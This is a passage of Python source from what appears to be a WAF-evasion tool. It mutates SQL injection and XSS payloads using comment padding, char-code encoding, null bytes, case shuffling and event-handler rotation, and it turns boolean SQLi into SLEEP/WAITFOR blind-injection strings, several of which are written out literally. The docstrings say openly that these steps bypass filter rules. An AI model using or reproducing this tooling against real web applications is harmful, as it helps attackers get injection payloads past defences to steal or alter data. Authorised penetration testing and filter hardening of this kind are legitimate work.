    def get_mutations(self) -> List[dict]:
        """Return available mutation types."""
        return [
            {"id": "synonym_replace", "name": "Keyword Synonym Replacement",
             "description": "Replace SQL/JS keywords with equivalent alternatives (|| for OR, && for AND)",
             "category": "mutation"},
            {"id": "comment_padding", "name": "Comment Padding",
             "description": "Insert /*!...*/ MySQL versioned comments around keywords",
             "category": "mutation"},
            {"id": "numeric_obfuscate", "name": "Numeric Obfuscation",
             "description": "Replace 1=1 with equivalent true expressions (2>1, 'a'='a')",
             "category": "mutation"},
            {"id": "char_code_build", "name": "Char-Code Building",
             "description": "Convert strings to CHAR() or String.fromCharCode() expressions",
             "category": "mutation"},
            {"id": "null_byte_inject", "name": "Null Byte Injection",
             "description": "Insert %00 null bytes to bypass string termination checks",
             "category": "mutation"},
            {"id": "case_mutation", "name": "Advanced Case Mutation",
             "description": "Randomise character case using multiple patterns (random, alternating, title, inverted)",
             "category": "mutation"},
            {"id": "space_to_comment", "name": "Space-to-Comment",
             "description": "Replace all spaces with /**/ SQL comments, evades space-dependent rules",
             "category": "mutation"},
            {"id": "xss_event_rotate", "name": "XSS Event Handler Rotation",
             "description": "Replace onerror/onload with a random equivalent HTML event handler",
             "category": "mutation"},
            {"id": "timing_convert", "name": "Boolean-to-Timing Conversion",
             "description": "Convert OR 1=1 boolean injection to equivalent SLEEP()-based blind injection",
             "category": "mutation"},
            {"id": "full_mutate", "name": "Full Mutation",
             "description": "Apply all mutation techniques in combination",
             "category": "mutation"},
        ]

    def mutate(self, payload: str, mutation_type: str) -> dict:
        """Apply a mutation to a payload.

        Returns dict with mutated result and description.
        """
        mutations = {
            "synonym_replace": self._synonym_replace,
            "comment_padding": self._comment_padding,
            "numeric_obfuscate": self._numeric_obfuscate,
            "char_code_build": self._char_code_build,
            "null_byte_inject": self._null_byte_inject,
            "case_mutation": self._case_mutation,
            "space_to_comment": self._space_to_comment,
            "xss_event_rotate": self._xss_event_rotate,
            "timing_convert": self._timing_convert,
            "full_mutate": self._full_mutate,
        }

        if mutation_type not in mutations:
            raise ValueError(f"Unknown mutation: {mutation_type}")

        mutated = mutations[mutation_type](payload)
        return {
            "original": payload,
            "mutated": mutated,
            "mutation_type": mutation_type,
            "description": next(
                (m["name"] for m in self.get_mutations() if m["id"] == mutation_type),
                mutation_type
            ),
        }

    def generate_mutations(self, payload: str, count: int = 10) -> List[dict]:
        """Generate multiple diverse mutations of a payload."""
        results = []
        seen = set()
        mutation_types = [m["id"] for m in self.get_mutations()]

        for mt in mutation_types:
            if len(results) >= count:
                break
            try:
                result = self.mutate(payload, mt)
                if result["mutated"] not in seen:
                    seen.add(result["mutated"])
                    results.append(result)
            except Exception:
                continue

        # Generate additional variants by combining mutations
        for _ in range(count * 3):
            if len(results) >= count:
                break
            try:
                mt = random.choice(mutation_types[:-1])  # exclude full_mutate
                result = self.mutate(payload, mt)
                # Apply a second random mutation
                mt2 = random.choice(mutation_types[:-1])
                result2 = self.mutate(result["mutated"], mt2)
                result2["mutation_type"] = f"{mt} + {mt2}"
                result2["original"] = payload
                if result2["mutated"] not in seen:
                    seen.add(result2["mutated"])
                    results.append(result2)
            except Exception:
                continue

        return results[:count]

    # ── Mutation Implementations ──────────────────────────────

    def _synonym_replace(self, payload: str) -> str:
        """Replace SQL keywords with random synonyms."""
        import re
        result = payload
        for kw, synonyms in self.SQL_SYNONYMS.items():
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            if pattern.search(result):
                replacement = random.choice([s for s in synonyms if s != kw] or synonyms)
                result = pattern.sub(replacement, result, count=1)
        return result

    @staticmethod
    def _comment_padding(payload: str) -> str:
        """Wrap keywords in MySQL versioned comments."""
        import re
        keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
                    'FROM', 'WHERE', 'TABLE', 'OR', 'AND']
        result = payload
        for kw in keywords:
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            matches = list(pattern.finditer(result))
            for match in reversed(matches):
                original_text = match.group()
                version = random.choice(["50000", "50001", "40100", ""])
                if version:
                    replacement = f"/*!{version} {original_text}*/"
                else:
                    replacement = f"/*!{original_text}*/"
                result = result[:match.start()] + replacement + result[match.end():]
        return result

    def _numeric_obfuscate(self, payload: str) -> str:
        """Replace simple boolean conditions with equivalents."""
        import re
        result = payload
        # Replace 1=1 patterns
        for pattern_str in [r"1\s*=\s*1", r"'1'\s*=\s*'1'"]:
            if re.search(pattern_str, result):
                replacement = random.choice(self.NUMERIC_TRUTHS)
                result = re.sub(pattern_str, replacement, result, count=1)
        return result

    @staticmethod
    def _char_code_build(payload: str) -> str:
        """Convert string literals to CHAR() or fromCharCode() calls."""
        import re
        # Detect if it looks like SQL or JS
        is_js = any(kw in payload.lower() for kw in ['script', 'alert', 'eval', 'document'])

        if is_js:
            # Convert alert('XSS') -> alert(String.fromCharCode(88,83,83))
            def replace_string(m):
                s = m.group(1)
                codes = ",".join(str(ord(c)) for c in s)
                return f"String.fromCharCode({codes})"
            result = re.sub(r"'([^']+)'", replace_string, payload)
            result = re.sub(r'"([^"]+)"', replace_string, result)
        else:
            # Convert string to CHAR() for SQL
            def replace_string_sql(m):
                s = m.group(1)
                chars = ",".join(f"CHAR({ord(c)})" for c in s)
                return f"CONCAT({chars})"
            result = re.sub(r"'([^']{1,20})'", replace_string_sql, payload)
        return result

    @staticmethod
    def _null_byte_inject(payload: str) -> str:
        """Insert null bytes at strategic positions."""
        import re
        result = payload
        # Insert %00 before key characters
        for char in ["'", '"', ";", "-", "<", ">"]:
            result = result.replace(char, f"%00{char}")
        return result

    @staticmethod
    def _case_mutation(payload: str) -> str:
        """Advanced case mutation: randomly picks one of four strategies.
        - random: each alpha char randomly upper/lower
        - title: Title Case every word  
        - inverted: invert current case of each char
        - leet: mix of case + digit substitutions in keywords
        """
        import re
        strategy = random.choice(["random", "inverted", "block"])

        if strategy == "random":
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in payload
            )
        elif strategy == "inverted":
            return "".join(
                c.lower() if c.isupper() else c.upper()
                for c in payload
            )
        else:
            # block: alternate uppercase/lowercase blocks of 2-3 chars
            result = []
            i = 0
            upper = True
            while i < len(payload):
                block = random.randint(2, 3)
                chunk = payload[i:i+block]
                result.append(chunk.upper() if upper else chunk.lower())
                upper = not upper
                i += block
            return "".join(result)

    @staticmethod
    def _space_to_comment(payload: str) -> str:
        """Replace all spaces with SQL inline comments /**/.
        Breaks space-dependent WAF regex without altering SQL semantics."""
        return payload.replace(" ", "/**/")

    def _xss_event_rotate(self, payload: str) -> str:
        """Replace known XSS event handlers (onerror, onload) with random alternatives.
        WAF blocklists often enumerate only a few events — rotation bypasses them."""
        import re
        result = payload
        known_events = ["onerror", "onload", "onfocus", "onclick", "onmouseover"]
        target = next((e for e in known_events if e in result.lower()), None)

        if target:
            replacement = random.choice([e for e in self.XSS_EVENTS if e != target])
            result = re.sub(re.escape(target), replacement, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _timing_convert(payload: str) -> str:
        """Convert boolean-based SQLi (OR 1=1) to time-based blind SQLi (SLEEP/WAITFOR).
        Time-based variants are harder to detect with static analysis.

        MySQL  → AND SLEEP(5)--
        MSSQL  → AND WAITFOR DELAY '0:0:5'--
        Oracle → AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
        """
        import re
        timing_variants = [
            "' AND SLEEP(5)--",
            "' AND 1=1 AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR SLEEP(5)--",
            "1; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(5000000,MD5(1))--",
        ]

        # If payload already has a boolean condition, replace it
        if re.search(r"(?i)(or|and)\s+\d+\s*=\s*\d+", payload):
            base = re.sub(r"(?i)(or|and)\s+\d+\s*=\s*\d+.*", "", payload).rstrip()
            return base + " " + random.choice(timing_variants)

        # Otherwise append to payload
        return payload.rstrip("- ") + " " + random.choice(timing_variants)

    def _full_mutate(self, payload: str) -> str:
        """Apply a curated combination of mutation techniques in sequence.
        Runs: synonym → comment_padding → numeric → space_to_comment"""
        result = payload
        result = self._synonym_replace(result)
        result = self._comment_padding(result)
        result = self._numeric_obfuscate(result)
        result = self._space_to_comment(result)
        return result
